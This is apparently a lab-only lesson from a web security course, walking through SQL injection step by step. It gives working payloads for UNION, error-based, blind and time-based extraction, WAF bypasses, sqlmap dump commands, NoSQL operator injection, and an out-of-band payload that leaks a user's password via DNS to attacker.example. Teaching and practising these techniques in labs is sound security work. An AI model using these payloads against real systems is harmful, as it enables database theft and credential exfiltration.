# Week 05: Attack walkthrough — SQL Injection

> ⚠️ **Lab only.**

---

## The mental model

SQL injection happens when **user input gets concatenated into a SQL query string** without parameterization. The query the database executes is:

```sql
SELECT * FROM products WHERE category = 'gifts'
```

But what the developer wrote was:

```python
query = f"SELECT * FROM products WHERE category = '{user_input}'"
```

If `user_input` is `gifts`, you get the intended query. If `user_input` is `gifts' OR 1=1--`, you get:

```sql
SELECT * FROM products WHERE category = 'gifts' OR 1=1--'
```

Everything after `--` is a comment. `OR 1=1` is always true. You just bypassed the filter.

## Step 0: Identify a SQLi candidate

For every parameter you see in HTTP traffic, ask: *does this end up in a query?*

Strong candidates:

- Search boxes
- Filter / sort parameters
- Login forms (especially `username`)
- Anywhere you see `id=`, `category=`, `sort=`, `name=`, `email=`
- API filters (`?status=active`, `?role=admin`)
- Less obvious: HTTP headers used for personalization (`X-Forwarded-For`, `User-Agent`, `Cookie`)

## Step 1: Confirm injection

Three quick probes for any candidate:

### Probe 1: Single quote

```
?category=gifts'
```

If the response shows a database error (`unclosed quotation mark`, `syntax error near...`), you've confirmed *string-context* SQLi.

### Probe 2: Logical equivalence

```
?category=gifts' AND '1'='1
?category=gifts' AND '1'='2
```

If the first returns normal results and the second returns nothing (or different results), you've confirmed *blind* SQLi.

### Probe 3: Comment

```
?category=gifts'--
?category=gifts'#
?category=gifts'/*
```

Different DBs use different comment styles. If one of them returns normal results (the rest of the query commented out), you've identified both injectability *and* DB family.

## Step 2: UNION-based extraction

UNION lets you append rows from another query:

```sql
SELECT name, price FROM products WHERE category = 'gifts'
UNION SELECT username, password FROM users--
```

You need three things to make UNION work:

1. **Same column count** as the original query
2. **Compatible data types** in each column
3. **Knowing what tables to query**

### Find the column count

```
?category=gifts' UNION SELECT NULL--
?category=gifts' UNION SELECT NULL, NULL--
?category=gifts' UNION SELECT NULL, NULL, NULL--
```

Increment NULLs until the error goes away (or the response shape changes). That tells you the column count.

Faster: use `ORDER BY`:

```
?category=gifts' ORDER BY 1--    → OK
?category=gifts' ORDER BY 2--    → OK
?category=gifts' ORDER BY 3--    → ERROR ("unknown column 3")
```

Two columns confirmed.

### Find the type of each column

Replace each NULL with a string. The column that doesn't error is your text column:

```
?category=gifts' UNION SELECT 'a', NULL--      → first column is text
?category=gifts' UNION SELECT NULL, 'a'--      → second column is text
```

### Enumerate the schema

The system tables that list schemas vary by DB. Knowing them is half the battle:

| DB | Get table list |
|---|---|
| MySQL / MariaDB | `SELECT table_name FROM information_schema.tables` |
| PostgreSQL | `SELECT table_name FROM information_schema.tables` |
| MSSQL | `SELECT name FROM sysobjects WHERE xtype='U'` |
| Oracle | `SELECT table_name FROM all_tables` |
| SQLite | `SELECT name FROM sqlite_master WHERE type='table'` |

So:

```
?category=gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Returns table names. Then get columns for a target table:

```
?category=gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

Then extract:

```
?category=gifts' UNION SELECT username, password FROM users--
```

That's the whole `users` table.

## Step 3: Error-based extraction

When UNION isn't easy but the app shows verbose DB errors, you can smuggle data into the error message:

### MySQL trick

```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)
```

The malformed GROUP BY causes a duplicate-key error that *includes* the result of `version()`. Ugly but effective.

### MSSQL trick

```
?id=1 AND 1=CONVERT(int, (SELECT @@version))
```

Converting a string to int errors out and dumps the string. Same idea.

Modern apps typically suppress detailed errors. When they don't, this is a fast extraction path.

## Step 4: Blind boolean-based

The response doesn't show data and doesn't error verbosely. But it differs *behaviorally* depending on whether your injected condition is true:

```
?id=1' AND substring(database(),1,1)='a'--      → page returns normal content (true)
?id=1' AND substring(database(),1,1)='b'--      → page returns nothing (false)
...
?id=1' AND substring(database(),1,1)='m'--      → true
```

Iterate through letters to find each character of `database()`. Slow, but it works.

Burp Intruder + the cluster-bomb attack type automates this — wordlist of (position, letter) → confirm which combination returns the "true" response.

The PortSwigger "Conditional responses" lab is built around this.

## Step 5: Blind time-based

When even the boolean signal is hidden (identical responses for true/false), induce a delay on `true`:

```
?id=1' AND IF(substring(database(),1,1)='a', SLEEP(5), 0)--      → 5s delay → 'a'
?id=1' AND IF(substring(database(),1,1)='b', SLEEP(5), 0)--      → no delay → not 'b'
```

| DB | Sleep function |
|---|---|
| MySQL | `SLEEP(5)` |
| Postgres | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| Oracle | `DBMS_LOCK.SLEEP(5)` |
| SQLite | `randomblob(100000000)` (CPU-bound delay) |

Each request is slow by design, so you want short queries. Use binary search instead of linear:

```
?id=1' AND IF(ASCII(substring(database(),1,1)) > 109, SLEEP(5), 0)--    → halve the search space
```

Cuts 26 attempts down to ~5 per character.

## Step 6: Out-of-band (OAST) — when in-band is silent

A truly silent app can still leak via DNS or HTTP to a server you control:

```
?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.example\\share'))--
```

The DB tries to read a file from a path containing the secret. The DNS lookup hits `password.attacker.example`. You read the DNS log; the password is the subdomain.

This requires the DB to have outbound network. Often it does. **Burp Collaborator** automates the listener side.

## Step 7: Second-order SQLi

The payload is stored *cleanly* in step 1, then *used unsafely* in step 2:

```
Step 1: register username = "alice' --"   ← stored cleanly via parameterized INSERT
Step 2: change password while logged in as alice
        backend builds:
        UPDATE users SET password='newpw' WHERE username='alice' --'
                                                                  ^^ from your stored row
```

The second query, built by concatenating the stored username, runs without the rest of the WHERE clause — updates *every* user's password.

Often missed by scanners because the injection point and execution point are different requests, sometimes different services.

## Step 8: WAF / filter bypasses

When the app or a WAF blocks obvious patterns:

| Filter | Bypass |
|---|---|
| Blocks `'` | Use `"` or numeric injection in integer params (no quote needed) |
| Blocks `UNION SELECT` | `UNION/**/SELECT`, `UNION%0aSELECT`, `UnIoN SeLeCt` |
| Blocks `--` | Use `#` or `/* */` |
| Blocks spaces | `UNION/**/SELECT`, `UNION(SELECT...)`, `UNION%09SELECT` (tab) |
| Blocks keywords | `UNI%55ON SE%4cECT` (URL-encode interesting chars) |
| Blocks single payloads | Stack with HTTP parameter pollution: `?id=1&id=2 UNION SELECT...` |
| Strict allow-list at edge | Smuggle via JSON, XML, or header values that bypass URL-level filter |

The PortSwigger "XML encoding" lab is the canonical exercise — the WAF doesn't decode XML entities, so `&#x55;NION SELECT` slips through.

## Step 9: sqlmap (in lab only)

Manual exploitation teaches you what's happening. sqlmap automates the enumeration once you know it works:

```bash
# Confirm the vuln Burp has already found
sqlmap -u "http://lab.local/products?category=gifts" --batch

# Dump databases
sqlmap -u "http://lab.local/products?category=gifts" --batch --dbs

# Dump a table
sqlmap -u "http://lab.local/products?category=gifts" --batch -D shop -T users --dump

# Use a request file from Burp (handles complex POST bodies, headers)
sqlmap -r request.txt --batch
```

Useful flags:

- `--risk=3 --level=5` — try the noisier and more exhaustive payloads (slow)
- `--tamper=space2comment` — built-in WAF-bypass tampers
- `--proxy=http://127.0.0.1:8080` — route through Burp to log everything

**Don't run sqlmap against systems you don't own.** It generates large volumes of distinctive traffic and can corrupt data if it picks UPDATE/DELETE-based payloads.

## Step 10: Modern flavors — NoSQL injection (preview)

Same root cause, different syntax:

```
{ "user": "alice", "pass": {"$ne": null} }
```

Mongo accepts `$ne` as "not equal to null" — matches any user where the password field exists. Login bypassed.

We don't go deep on NoSQL injection this week, but the *pattern* (user-controlled query operators) is the same. Same defense pattern too: don't accept query operators from user input.

## Common mistakes when learning

- **Giving up after one quote returns no error.** Modern apps often suppress errors. Move to boolean probes.
- **Forgetting that comment syntax differs by DB.** `--`, `#`, `/* */` — try all three.
- **Skipping the column-count step.** UNION with wrong column count won't work; you'll think the endpoint isn't vulnerable.
- **Running sqlmap as the first step.** You learn nothing. Manual first; sqlmap to scale.
- **Not realizing integer parameters don't need quote breaking.** `?id=1 UNION SELECT...` works directly.

Now read [defense.md](defense.md).
